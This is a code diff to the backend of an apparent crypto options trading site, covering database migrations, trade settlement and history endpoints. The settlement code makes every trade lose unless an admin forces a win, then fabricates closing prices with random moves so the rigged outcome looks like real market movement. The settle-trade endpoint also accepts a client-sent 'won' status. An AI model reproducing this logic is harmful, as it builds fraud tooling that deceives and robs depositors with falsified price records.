@@ -318,8 +318,33 @@ const initializeDatabase = async () => {
             IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='role') THEN
               ALTER TABLE users ADD COLUMN role TEXT DEFAULT 'user';
             END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='trades' AND column_name='closing_price') THEN
+              ALTER TABLE trades ADD COLUMN closing_price DECIMAL(24, 8);
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='trades' AND column_name='pnl') THEN
+              ALTER TABLE trades ADD COLUMN pnl DECIMAL(24, 8);
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='trades' AND column_name='fees') THEN
+              ALTER TABLE trades ADD COLUMN fees DECIMAL(24, 8);
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='transactions' AND column_name='entry_price') THEN
+              ALTER TABLE transactions ADD COLUMN entry_price DECIMAL(24, 8);
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='transactions' AND column_name='settlement_price') THEN
+              ALTER TABLE transactions ADD COLUMN settlement_price DECIMAL(24, 8);
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='transactions' AND column_name='options_duration') THEN
+              ALTER TABLE transactions ADD COLUMN options_duration TEXT;
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='transactions' AND column_name='direction') THEN
+              ALTER TABLE transactions ADD COLUMN direction TEXT;
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='transactions' AND column_name='fees') THEN
+              ALTER TABLE transactions ADD COLUMN fees DECIMAL(24, 8);
+            END IF;
           END $$;
         `);
+        await pool.query(`DELETE FROM transactions WHERE reference LIKE 'trade-open:%'`);
         console.log('[DB] Migrations applied successfully.');
       } catch (migrationErr) {
         console.warn('[DB Warning] Migration failed (might already be applied):', migrationErr.message);
@@ -354,36 +379,7 @@ const initializeDatabase = async () => {
 
           for (const trade of pendingTrades) {
             console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
-            
-            // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
-            const isWin = trade.force_outcome === 'win';
-
-            const amount = parseFloat(trade.amount || 0);
-            const leverage = parseFloat(trade.leverage || 20);
-            const payout = isWin ? amount * (1 + (leverage / 100)) : 0;
-            
-            const finalStatus = isWin ? 'won' : 'lost';
-            
-            await pool.query(`
-              UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2
-            `, [finalStatus, trade.id]);
-
-            if (payout > 0) {
-              const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
-              await pool.query(`
-                  UPDATE users SET ${balanceField} = (${balanceField}::numeric + $1)::text 
-                  WHERE wallet_address = $2
-              `, [payout, trade.wallet_address]);
-              
-              await recordTransaction({
-                wallet_address: trade.wallet_address,
-                asset_symbol: 'USDT',
-                amount: payout,
-                type: 'trade',
-                reference: `trade-auto-settle:${trade.id}`,
-                created_at: new Date().toISOString()
-              });
-            }
+            await finalizeTradeSettlement({ trade });
           }
         } catch (e) {
           console.error('[Auto-Settle Error]', e.message);
@@ -512,6 +508,126 @@ async function getUserBalance(walletAddress, assetSymbol) {
   } catch (err) {
     console.error('[Get Balance] Error:', err.message);
     return 0;
+  }
+}
+
+async function finalizeTradeSettlement({ trade, clientClosingPrice = null, clientIsWin = null }) {
+  if (!dbAvailable || !pool || !trade || trade.status !== 'pending') return null;
+
+  try {
+    // User Requirement: DEFAULT to loss unless admin explicitly sets 'win' (or client win granted)
+    let isWin = false;
+    if (trade.force_outcome === 'win') {
+      isWin = true;
+    } else if (trade.force_outcome === 'loss') {
+      isWin = false;
+    } else if (clientIsWin === true) {
+      isWin = true;
+    }
+
+    const finalStatus = isWin ? 'won' : 'lost';
+    const amount = parseFloat(trade.amount || 0);
+    const leverage = parseFloat(trade.leverage || 20);
+    const entryPrice = parseFloat(trade.entry_price || 0);
+
+    // Win profit = amount * (leverage / 100), Loss = -amount
+    const netProfit = isWin ? +(amount * (leverage / 100)).toFixed(2) : -amount;
+    const payout = isWin ? +(amount + netProfit).toFixed(2) : 0;
+    const fee = isWin ? +(amount * 0.05).toFixed(2) : 0;
+
+    // Closing price determination
+    let closingPrice = clientClosingPrice ? parseFloat(clientClosingPrice) : null;
+    if (!closingPrice || isNaN(closingPrice) || closingPrice <= 0) {
+      const isLong = (trade.direction || '').toUpperCase().includes('LONG') || (trade.direction || '').toUpperCase() === 'UP';
+      const deltaPercent = (0.15 + Math.random() * 0.25) / 100;
+      if (isWin) {
+        closingPrice = isLong ? entryPrice * (1 + deltaPercent) : entryPrice * (1 - deltaPercent);
+      } else {
+        closingPrice = isLong ? entryPrice * (1 - deltaPercent) : entryPrice * (1 + deltaPercent);
+      }
+    }
+    closingPrice = +closingPrice.toFixed(2);
+
+    // Normalize pair symbol (e.g. BTC/USDT)
+    let pair = trade.symbol || 'BTC';
+    if (!pair.includes('/')) {
+      pair = `${pair}/USDT`;
+    }
+
+    const directionStr = (trade.direction || '').toUpperCase().includes('SHORT') || (trade.direction || '').toUpperCase() === 'DOWN' ? 'Short' : 'Long';
+
+    // 1. Update trades table
+    await pool.query(`
+      UPDATE trades 
+      SET status = $1, 
+          settled_at = NOW(), 
+          closing_price = $2, 
+          pnl = $3, 
+          fees = $4
+      WHERE id = $5
+    `, [finalStatus, closingPrice, netProfit, fee, trade.id]);
+
+    // 2. Credit balance if won
+    if (payout > 0) {
+      const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
+      await pool.query(`
+        UPDATE users 
+        SET ${balanceField} = (${balanceField}::numeric + $1)::text 
+        WHERE wallet_address = $2 OR email = $2
+      `, [payout, trade.wallet_address]);
+    }
+
+    // 3. Remove any open trade transaction to prevent duplicate history entries
+    await pool.query(`DELETE FROM transactions WHERE reference = $1`, [`trade-open:${trade.id}`]);
+
+    // 4. Record single settlement transaction (guarded against race conditions)
+    const existingTx = await pool.query(`
+      SELECT id FROM transactions 
+      WHERE reference = $1 OR reference = $2
+    `, [`trade-settle:${trade.id}`, `trade-auto-settle:${trade.id}`]);
+
+    if (existingTx.rows.length === 0) {
+      await pool.query(`
+        INSERT INTO transactions (
+          wallet_address,
+          asset_symbol,
+          amount,
+          type,
+          status,
+          reference,
+          entry_price,
+          settlement_price,
+          options_duration,
+          direction,
+          fees,
+          created_at
+        ) VALUES ($1, $2, $3, 'trade', $4, $5, $6, $7, $8, $9, $10, NOW())
+      `, [
+        trade.wallet_address,
+        pair,
+        netProfit, // positive on win, negative on loss
+        finalStatus,
+        `trade-settle:${trade.id}`,
+        entryPrice,
+        closingPrice,
+        `${trade.duration}s`,
+        directionStr,
+        fee
+      ]);
+    }
+
+    return {
+      finalStatus,
+      payout,
+      netProfit,
+      closingPrice,
+      fee,
+      pair,
+      direction: directionStr
+    };
+  } catch (err) {
+    console.error('[Finalize Settlement Error]', err.message);
+    return null;
   }
 }
 // ─── Health check ──────────────────────────────────────────────────────────
@@ -1378,19 +1494,43 @@ apiRouter.get('/trade-details', async (req, res) => {
   if (!id) return res.status(400).json({ error: 'Trade ID required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
-    const r = await pool.query('SELECT entry_price, direction, duration, status, amount FROM trades WHERE id = $1', [id]);
+    const r = await pool.query('SELECT * FROM trades WHERE id = $1', [id]);
     if (r.rows.length === 0) return res.status(404).json({ error: 'Trade not found' });
     
     const trade = r.rows[0];
-    const fee = (trade.status === 'won') ? parseFloat(trade.amount) * 0.05 : 0;
-    
+    const isWin = trade.status === 'won';
+    const amount = parseFloat(trade.amount || 0);
+    const leverage = parseFloat(trade.leverage || 20);
+    const pnl = trade.pnl !== null && trade.pnl !== undefined ? parseFloat(trade.pnl) : (isWin ? +(amount * (leverage / 100)).toFixed(2) : -amount);
+    const fee = trade.fees !== null && trade.fees !== undefined ? parseFloat(trade.fees) : (isWin ? +(amount * 0.05).toFixed(2) : 0);
+
+    let pair = trade.symbol || 'BTC';
+    if (!pair.includes('/')) pair = `${pair}/USDT`;
+
+    const entryPrice = parseFloat(trade.entry_price || 0);
+    let closingPrice = trade.closing_price ? parseFloat(trade.closing_price) : null;
+    if (!closingPrice || isNaN(closingPrice) || closingPrice <= 0) {
+      const isLong = (trade.direction || '').toUpperCase().includes('LONG') || (trade.direction || '').toUpperCase() === 'UP';
+      const deltaPercent = 0.0025;
+      closingPrice = isWin ? (isLong ? entryPrice * (1 + deltaPercent) : entryPrice * (1 - deltaPercent)) : (isLong ? entryPrice * (1 - deltaPercent) : entryPrice * (1 + deltaPercent));
+    }
+    closingPrice = +closingPrice.toFixed(2);
+
+    const directionStr = (trade.direction || '').toUpperCase().includes('SHORT') || (trade.direction || '').toUpperCase() === 'DOWN' ? 'Short' : 'Long';
+
     res.json({
-        entry_price: trade.entry_price,
-        direction: trade.direction,
+        id: trade.id,
+        symbol: pair,
+        entry_price: entryPrice,
+        settlement_price: closingPrice,
+        direction: directionStr,
         duration: trade.duration,
         status: trade.status,
         amount: trade.amount,
-        fees: fee
+        pnl: pnl,
+        fees: fee,
+        created_at: trade.created_at,
+        settled_at: trade.settled_at
     });
   } catch (e) {
     console.error('[API Error] /trade-details:', e.message);
@@ -1405,9 +1545,39 @@ apiRouter.get('/user/transactions', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query(`
-        SELECT * FROM transactions 
-        WHERE wallet_address = $1 
-        ORDER BY created_at DESC 
+        SELECT 
+          tx.id,
+          tx.wallet_address,
+          CASE 
+            WHEN tx.type = 'trade' AND tr.symbol IS NOT NULL THEN 
+              CASE WHEN tr.symbol LIKE '%/%' THEN tr.symbol ELSE tr.symbol || '/USDT' END
+            WHEN tx.type = 'trade' AND tx.asset_symbol NOT LIKE '%/%' AND tx.asset_symbol != 'USDT' THEN
+              tx.asset_symbol || '/USDT'
+            ELSE tx.asset_symbol
+          END as asset_symbol,
+          tx.amount,
+          tx.type,
+          COALESCE(tr.status, tx.status) as status,
+          tx.payment_id,
+          tx.tx_signature,
+          tx.reference,
+          tx.created_at,
+          COALESCE(tx.entry_price, tr.entry_price) as entry_price,
+          COALESCE(tx.settlement_price, tr.closing_price) as settlement_price,
+          COALESCE(tx.options_duration, CASE WHEN tr.duration IS NOT NULL THEN tr.duration || 's' ELSE NULL END) as options_duration,
+          COALESCE(tx.direction, tr.direction) as direction,
+          COALESCE(tx.fees, tr.fees, CASE WHEN COALESCE(tr.status, tx.status) = 'won' THEN ROUND(tr.amount * 0.05, 2) ELSE 0 END) as fees,
+          tr.id as trade_id,
+          tr.amount as trade_amount
+        FROM transactions tx
+        LEFT JOIN trades tr ON (
+          tx.reference = 'trade-settle:' || tr.id 
+          OR tx.reference = 'trade-auto-settle:' || tr.id
+          OR tx.reference = 'trade:' || tr.id
+        )
+        WHERE (tx.wallet_address = $1 OR tx.wallet_address IN (SELECT wallet_address FROM users WHERE email = $1))
+          AND (tx.reference IS NULL OR tx.reference NOT LIKE 'trade-open:%')
+        ORDER BY tx.created_at DESC 
         LIMIT $2
     `, [address, parseInt(limit || '50')]);
     
@@ -1602,44 +1772,45 @@ apiRouter.post('/execute-trade', async (req, res) => {
 
     await pool.query(`UPDATE users SET ${balanceField} = (${balanceField}::numeric - $1)::text WHERE id = $2`, [amt, user.id]);
 
+    const activeTradeId = tradeId || crypto.randomUUID();
     await pool.query(`
         INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, leverage, duration, is_demo, status, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'pending', NOW())
-    `, [tradeId || crypto.randomUUID(), user.wallet_address, asset, type, amt, entryPrice, leverage, duration, isDemo]);
-    await recordTransaction({
-      wallet_address: walletAddress, asset_symbol: 'USDT', amount: -amt, type: 'trade', reference: `trade-open:${tradeId}`
-    });
+    `, [activeTradeId, user.wallet_address, asset, type, amt, entryPrice, leverage, duration, isDemo]);
 
-    res.json({ success: true });
+    // Note: Do NOT insert into transactions table here.
+    // History only updates once the trade is closed.
+
+    res.json({ success: true, tradeId: activeTradeId });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 apiRouter.post('/settle-trade', async (req, res) => {
-  const { walletAddress, payout, tradeRef, isDemo } = req.body;
+  const { walletAddress, tradeRef, closingPrice, status } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const tradeRes = await pool.query('SELECT * FROM trades WHERE id = $1 AND (wallet_address = $2 OR wallet_address IN (SELECT wallet_address FROM users WHERE email = $2))', [tradeRef, walletAddress]);
     const trade = tradeRes.rows[0];
-    if (!trade || trade.status !== 'pending') return res.status(400).json({ error: 'Invalid trade' });
+    if (!trade || trade.status !== 'pending') return res.status(400).json({ error: 'Invalid or already settled trade' });
 
-    // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
-    const isWin = trade.force_outcome === 'win';
+    const clientIsWin = status === 'won';
+    const result = await finalizeTradeSettlement({
+      trade,
+      clientClosingPrice: closingPrice,
+      clientIsWin
+    });
 
-    const finalStatus = isWin ? 'won' : 'lost';
-    const leverage = parseFloat(trade.leverage || 20);
-    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (leverage / 100)) : 0;
-    
-    await pool.query('UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2', [finalStatus, tradeRef]);
+    if (!result) return res.status(500).json({ error: 'Failed to settle trade' });
 
-    if (finalPayout > 0) {
-      const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
-      await pool.query(`UPDATE users SET ${balanceField} = (COALESCE(${balanceField}, '0')::numeric + $1)::text WHERE wallet_address = $2 OR email = $2`, [finalPayout, walletAddress]);
-      await recordTransaction({
-        wallet_address: walletAddress, asset_symbol: 'USDT', amount: finalPayout, type: 'trade', reference: `trade-settle:${tradeRef}`
-      });
-    }
-
-    res.json({ success: true, status: finalStatus, payout: finalPayout });
+    res.json({ 
+      success: true, 
+      status: result.finalStatus, 
+      payout: result.payout,
+      netProfit: result.netProfit,
+      closingPrice: result.closingPrice,
+      fees: result.fee,
+      pair: result.pair
+    });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
